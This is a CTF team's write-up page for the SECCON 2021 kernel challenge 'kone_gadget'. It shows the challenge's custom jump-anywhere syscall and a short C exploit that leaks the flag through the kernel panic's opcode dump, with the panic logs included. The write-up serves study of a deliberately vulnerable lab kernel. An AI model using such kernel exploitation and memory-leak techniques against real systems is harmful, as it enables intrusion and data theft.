@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>kone_gadget | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="kone_gadget" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/SECCON-2021/pwn/kone_gadget.html" />
+<meta property="og:url" content="https://org.anize.rs/SECCON-2021/pwn/kone_gadget.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="kone_gadget" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"kone_gadget","url":"https://org.anize.rs/SECCON-2021/pwn/kone_gadget.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="kone_gadget">kone_gadget</h1>
+
+<p><strong>Authors</strong> <a href="https://twitter.com/_MatteoRizzo">Nspace</a></p>
+
+<p><strong>Tags</strong>: pwn, kernel</p>
+
+<p><strong>Points</strong>: 365 (5 solves)</p>
+
+<blockquote>
+  <p>Does any “one gadget” exist in kernel-land?
+<code class="language-plaintext highlighter-rouge">nc niwatori.quals.seccon.jp 11111</code>
+<a href="https://secconctf-prod.s3.isk01.sakurastorage.jp/production/kone_gadget/kone_gadget.tar.gz">kone_gadget.tar.gz</a> deb1280bb874b1847f5891599784bf683bee65dc</p>
+
+  <p>author:ptr-yudai</p>
+</blockquote>
+
+<h2 id="tl-dr">TL; DR:</h2>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">jmp</span> <span class="nv">flag</span>
+</code></pre></div></div>
+
+<p>The panic handler prints out the flag.</p>
+
+<h2 id="analysis">Analysis</h2>
+
+<p>The setup is pretty simple. We get an unprivileged shell in a Linux VM and the flag is in a file inside the VM that only root can read. We have to exploit the kernel to gain root privileges to that we can read the flag. The challenge VM has every mitigation (SMEP, SMAP, KPTI) enabled except KASLR.</p>
+
+<p>The challenge’s kernel has a custom syscall, <code class="language-plaintext highlighter-rouge">SYS_seccon</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SYSCALL_DEFINE1</span><span class="p">(</span><span class="n">seccon</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">,</span> <span class="n">rip</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span><span class="s">"xor %%edx, %%edx;"</span>
+               <span class="s">"xor %%ebx, %%ebx;"</span>
+               <span class="s">"xor %%ecx, %%ecx;"</span>
+               <span class="s">"xor %%edi, %%edi;"</span>
+               <span class="s">"xor %%esi, %%esi;"</span>
+               <span class="s">"xor %%r8d, %%r8d;"</span>
+               <span class="s">"xor %%r9d, %%r9d;"</span>
+               <span class="s">"xor %%r10d, %%r10d;"</span>
+               <span class="s">"xor %%r11d, %%r11d;"</span>
+               <span class="s">"xor %%r12d, %%r12d;"</span>
+               <span class="s">"xor %%r13d, %%r13d;"</span>
+               <span class="s">"xor %%r14d, %%r14d;"</span>
+               <span class="s">"xor %%r15d, %%r15d;"</span>
+               <span class="s">"xor %%ebp, %%ebp;"</span>
+               <span class="s">"xor %%esp, %%esp;"</span>
+               <span class="s">"jmp %0;"</span>
+               <span class="s">"ud2;"</span>
+               <span class="o">:</span> <span class="o">:</span> <span class="s">"rax"</span><span class="p">(</span><span class="n">rip</span><span class="p">));</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The custom syscall zeroes every general-purpose register and then jumps to an address chosen by us. Somehow we have to use this to become root.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>This syscall would be trivial to exploit if we could simply jump to some shellcode in userspace and execute that. Unfortunately SMEP and KPTI would crash the kernel if we tried to do that, so it’s not an option. We can only execute code in kernel pages. Under normal circumstances this is not a problem because we can use the RIP control to start a JOP chain or call a function in the kernel. Unfortunately <code class="language-plaintext highlighter-rouge">SYS_seccon</code> clears all the registers, including the stack pointer before jumping to our target. This makes the bug rather annoying to exploit:</p>
+
+<ul>
+  <li>We cannot call any kernel functions because they all assume that they have a valid stack so they crash either in the function prologue or when they return. Moreover even if we still had a valid stack we wouldn’t have any control over the arguments that these functions are called with.</li>
+  <li>We cannot use the standard JOP approach of switching the stack to controlled memory and then starting a ROP chain because all the registers (except <code class="language-plaintext highlighter-rouge">rax</code>) are zero. We would somehow need to find some code in the kernel that contains a pointer to some controlled kernel memory, that contains a valid stack pivot, and that we can get to without crashing. Doesn’t seem very likely.</li>
+  <li>As soon as the CPU receives an interrupt the kernel will crash with a double fault because the interrupt handlers also assumes that there is a valid stack.</li>
+</ul>
+
+<p>The challenge description hints at a “one gadget in kernel-land”, a sequence of instruction that is present in the kernel and that will give us root when jumped to. While the idea might seem a bit far-fetched, there are <a href="https://github.com/david942j/one_gadget">one-shot gadgets</a> in glibc that spawn a shell when jumped to so it doesn’t seem entirely out of the realm of possibility<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>. With that in mind I started searching, and didn’t find anything. I did find some gadgets that would get back a valid stack by reading it from <code class="language-plaintext highlighter-rouge">gs:cpu_current_top_of_stack</code>, but none of them do anything useful. All the other gadgets would need a valid stack to be useful.</p>
+
+<p>The other idea that I had was to modify some variable that is later used in the double fault handler. Normally a double fault panics and doesn’t do anything else, but maybe there is a way to modify a variable so that the handler does what we want? Sadly there doesn’t seem to be anything we can do here either.</p>
+
+<p>At this point I was run out of things to try but staring at so many kernel panics gave me a new idea. Consider the following kernel panic message:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>traps: PANIC: double fault, error_code: 0x0
+double fault: 0000 [#1] SMP PTI
+CPU: 0 PID: 129 Comm: pwn Not tainted 5.14.12 #4
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
+RIP: 0010:commit_creds+0x0/0x190
+Code: 48 89 e5 e8 92 fe ff ff 5d c3 8b 07 85 c0 7e 16 48 85 ff 74 05 3e ff 0f 74 01 c3 55 48 89 e5 e8 76 fe ff ff 5d c3 0f 0b 66 90 &lt;55&gt; 48 89 e5 41 55 65 4c 8b 2c 25 c0 6c 01 00 41 54 53 4d 8b a5 78
+RSP: 0018:0000000000000000 EFLAGS: 00010246
+RAX: ffffffff81073ad0 RBX: 0000000000000000 RCX: 0000000000000000
+RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
+RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
+R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
+R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
+FS:  00000000004040b8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: fffffffffffffff8 CR3: 0000000002ee2000 CR4: 00000000003006f0
+</code></pre></div></div>
+
+<p>The panic message is meant to help people debug the problem, so it includes quite a bit of information about the state of the kernel prior to the crash. For example it contains the values of the registers, a stack trace (not present here since we don’t have a valid stack), and a printout of the machine code where the kernel crashed. On x86 the machine code is printed by <a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/kernel/dumpstack.c#L119"><code class="language-plaintext highlighter-rouge">show_opcodes</code></a>, which prints the 42 bytes preceding the address where the kernel crashed. However there is no check that these bytes are actually code: in principle they could be anything, even data.</p>
+
+<p>So… could we use this to read the flag?</p>
+
+<p>The answer is yes, at least for this challenge. The flag is located in memory, in the initramfs. The initramfs is just an uncompressed CPIO file so the flag is just there in plaintext, somewhere. Since there is no KASLR, the virtual address at which the initramfs is mapped is also constant between runs<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup>. The easiest way to locate the flag in memory is to dump the entire memory of the VM from the QEMU monitor and search for the flag in there. We can find the flag at physical address <code class="language-plaintext highlighter-rouge">0x228B000</code>, which is mapped at <code class="language-plaintext highlighter-rouge">0xffff88800228B000</code> in the physmap.</p>
+
+<p>All that we have to do is to jump there, and we get the flag from the panic message.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">syscall</span><span class="p">(</span><span class="mi">1337</span><span class="p">,</span> <span class="mh">0xffff88800228B000</span> <span class="o">+</span> <span class="mi">42</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>traps: PANIC: double fault, error_code: 0x0
+double fault: 0000 [#1] SMP PTI
+CPU: 0 PID: 187 Comm: pwn Not tainted 5.14.12 #4
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
+RIP: 0010:0xffff88800228b02a
+Code: 53 45 43 43 4f 4e 7b 50 6c 65 61 73 65 20 44 4d 20 70 74 72 2d 79 75 64 61 69 20 69 66 20 55 20 73 6f 6c 76 65 64 20 74 68 69 &lt;73&gt; 20 77 69 74 68 6f 75 74 20 73 65 63 63 6f 6d 70 20 6f 72 20 62
+RSP: 0018:0000000000000000 EFLAGS: 00000246
+RAX: ffff88800228b02a RBX: 0000000000000000 RCX: 0000000000000000
+RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
+RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
+R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000
+R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
+FS:  00000000004040b8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: fffffffffffffff8 CR3: 0000000002e20000 CR4: 00000000003006f0
+Call Trace:
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">SECCON{Please DM ptr-yudai if U solved this without seccomp or bpf}</code></p>
+
+<p>As you have probably guessed (and as the flag hints at), this solution was completely unintended. The intended way was to use the in-kernel BPF jit to mount a jit spraying attack on the kernel. This sounds makes a lot of sense but we didn’t think of it during the CTF. Oh well… Still thanks to the author, it was a fun challenge to work on.</p>
+
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:1" role="doc-endnote">
+      <p>It’s worth noting though that the one-shot gadgets in glibc would not work without a valid stack. Had we had a valid stack here, this challenge would have been much easier. <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+    <li id="fn:2" role="doc-endnote">
+      <p>Even with KASLR we could have probably brute forced the address, as KASLR has notoriously low entropy. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
+    </li>
+  </ol>
+</div>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
